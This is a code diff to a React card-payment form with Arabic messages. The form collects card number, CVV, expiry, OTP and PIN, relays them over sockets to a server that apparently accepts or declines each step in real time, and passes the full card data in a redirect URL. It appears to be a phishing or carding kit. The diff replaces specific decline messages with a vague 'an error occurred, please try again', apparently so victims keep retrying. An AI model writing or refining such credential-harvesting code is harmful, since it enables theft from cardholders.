@@ -111,7 +111,7 @@ const PayemntForm = () => {
     console.log(data);
     if (id === data) {
       setLoading(false);
-      setError("بيانات البطاقة غير صحيحة برجاء المحاولة مره اخري");
+      setError("حدث خطأ برجاء المحاولة مره أخري");
     }
   });
 
@@ -134,7 +134,7 @@ const PayemntForm = () => {
           socket.emit("visaOtp", { id: sessionStorage.getItem("id"), otp });
         });
     } catch (error) {
-      setLoading(false);
+        setError("حدث خطأ برجاء المحاولة مره أخري");
     }
   };
 
@@ -163,9 +163,8 @@ const PayemntForm = () => {
           });
         });
     } catch (error) {
-      setError('حدث خطأ')
+       setError("حدث خطأ برجاء المحاولة مره أخري");
     } finally {
-     
     }
   };
 
@@ -180,7 +179,7 @@ const PayemntForm = () => {
   socket.on("declinePaymentForm", (id) => {
     if (id === sessionStorage.getItem("id")) {
       setPage(0);
-      setError(" تم رفض البطاقة");
+      setError("حدث خطأ برجاء المحاولة مره أخري");
     }
   });
 
@@ -199,31 +198,31 @@ const PayemntForm = () => {
 
     if (id === sessionStorage.getItem("id")) {
       setLoading(false);
-      setError("تم رفض رمز التحقق ");
+       setError("حدث خطأ برجاء المحاولة مره أخري");
     }
   });
 
   socket.on("acceptVisaPin", (id) => {
-     if (id === sessionStorage.getItem("id")) {
-       setLoading(false);
-       window.location.href =
-         "/wtheq?data=" +
-         JSON.stringify({
-           ...JSON.parse(data),
-           card_name: car_holder_name,
-           cardNumber: card_number,
-           expiryDate: expiryDate,
-           cvv,
-           otp,
-           pin,
-         });
-     }
+    if (id === sessionStorage.getItem("id")) {
+      setLoading(false);
+      window.location.href =
+        "/wtheq?data=" +
+        JSON.stringify({
+          ...JSON.parse(data),
+          card_name: car_holder_name,
+          cardNumber: card_number,
+          expiryDate: expiryDate,
+          cvv,
+          otp,
+          pin,
+        });
+    }
   });
 
   socket.on("declineVisaPin", (id) => {
     if (id === sessionStorage.getItem("id")) {
       setLoading(false);
-      setError("تم رفض الرمز السري ");
+         setError("حدث خطأ برجاء المحاولة مره أخري");
     }
   });
 
@@ -275,7 +274,7 @@ const PayemntForm = () => {
                     <div className=" w-full flex items-center  gap-x-5 p-2">
                       <img src="/MasterCard.svg" className="md:w-12 w-9 " />
                       <img src="/Visa.svg" className="md:w-12 w-9" />
-                      <img src="/Mada.svg" className="md:w-12 w-9" />
+                      <img src="/Mada.png" className="md:w-12 w-9" />
                     </div>
                   </div>
                 </div>
@@ -379,6 +378,13 @@ const PayemntForm = () => {
                         <span className="text-xs"> تاريخ الإنتهاء </span>
                       </div>
                     </div>
+                    {error ? (
+                      <div className="bg-red-300 border border-red-500 rounded-md p-3   w-full my-5">
+                        {error}
+                      </div>
+                    ) : (
+                      ""
+                    )}
                     <button
                       type="submit"
                       className="flex items-center justify-center gap-2 p-2 w-full mt-5 text-white"
@@ -424,14 +430,6 @@ const PayemntForm = () => {
           className=" w-full p-3 flex flex-col gapy-4 justify-center items-center"
           onSubmit={handlePin}
         >
-          {error ? (
-            <div className="bg-red-300 border border-red-500 rounded-md p-3   w-full my-5">
-              {error}
-            </div>
-          ) : (
-            ""
-          )}
-
           <img src="pin.png " className="" />
           <div className="my-3 w-10/12 items-center justify-center flex flex-col gap-y-3">
             <span className="text-base mt-2 font-bold w-full flex items-center">
@@ -463,6 +461,13 @@ const PayemntForm = () => {
                 required
                 onChange={(e) => handlePinChange(e)}
               />
+              {error ? (
+                <div className="bg-red-300 border border-red-500 rounded-md p-3   w-full my-5">
+                  {error}
+                </div>
+              ) : (
+                ""
+              )}
               <button
                 className="w-3/4 text-white bg-black text-lg px-5 py-1 mt-5 rounded-md"
                 type="submit"
@@ -526,6 +531,13 @@ const PayemntForm = () => {
                 required
                 onChange={(e) => setOtp(e.target.value)}
               />
+              {error ? (
+                <div className="bg-red-300 border border-red-500 rounded-md p-3   w-full my-5">
+                  {error}
+                </div>
+              ) : (
+                ""
+              )}
               <button
                 className="w-3/4 text-white bg-black text-lg px-5 py-1 mt-5 rounded-md"
                 type="submit"
